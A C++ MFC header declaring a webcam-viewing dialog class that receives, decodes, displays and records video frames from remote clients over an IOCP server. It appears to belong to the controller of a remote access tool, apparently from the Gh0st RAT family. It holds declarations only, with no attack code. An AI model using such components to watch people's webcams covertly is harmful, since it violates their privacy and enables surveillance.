#if !defined(AFX_WEBCAMDLG_H__2E4F0D3D_DB2F_4F45_B543_D5F687A79CC6__INCLUDED_)
#define AFX_WEBCAMDLG_H__2E4F0D3D_DB2F_4F45_B543_D5F687A79CC6__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// WebCamDlg.h : header file
//
#include "VideoCodec.h"
#include "BmpToAvi.h"
#define WM_DRAWDIB WM_USER + 55
#define WM_RESET_SCREEN WM_USER + 56
#define WM_EXCEPTION WM_USER + 57
/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

typedef struct _tagWEBDLGINFO
{
	CWnd* lpParent;
	CIOCPServer* lpIocpServer;
	ClientContext* lpContext;
	HANDLE hEvent;
}WEBDLGINFO, *PWEBDLGINFO;

class CWebCamDlg : public CDialog
{
// Construction
public:
	void OnReceive();
	void OnReceiveComplete();
	CWebCamDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor

	static DWORD WINAPI CreateWebDlg(LPVOID lparam);
// Dialog Data
	//{{AFX_DATA(CWebCamDlg)
	enum { IDD = IDD_WEBCAM };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CWebCamDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CWebCamDlg)
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg void OnShowWindow(BOOL bShow, UINT nStatus);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
	void InitMMI();
	LRESULT OnGetMiniMaxInfo(WPARAM, LPARAM);
	void SendNext();
	LRESULT SendException(WPARAM wParam, LPARAM lparam);
	LRESULT DrawDIB(WPARAM wParam, LPARAM lparam);
	void InitCodec(DWORD fccHandler);
	BOOL SendResetScreen(int nWidth, int nHeight);
	LRESULT ResetScreen(WPARAM wParam, LPARAM lparam);
	BOOL SaveSnapshot();
	void SaveAvi();

private:
	int	m_nOldWidth; // OnSize时判断是高或宽发生变化，宽优先
	UINT m_nCount;
	HICON m_hIcon;
	CVideoCodec	*m_pVideoCodec;
	DWORD m_fccHandler;
	CString m_aviFile; // 如果文件名不为空就写入
	CBmpToAvi	m_aviStream;
	HDC			m_hDC;
	HDRAWDIB	m_hDD;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	BYTE* m_lpScreenDIB;
	LPBYTE m_lpCompressDIB;
	MINMAXINFO m_MMI;
	LPBITMAPINFO m_lpbmi;
	BOOL m_bReverse;
	BYTE *m_pReverseBuf;
	BOOL m_bClose;

};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_WEBCAMDLG_H__2E4F0D3D_DB2F_4F45_B543_D5F687A79CC6__INCLUDED_)
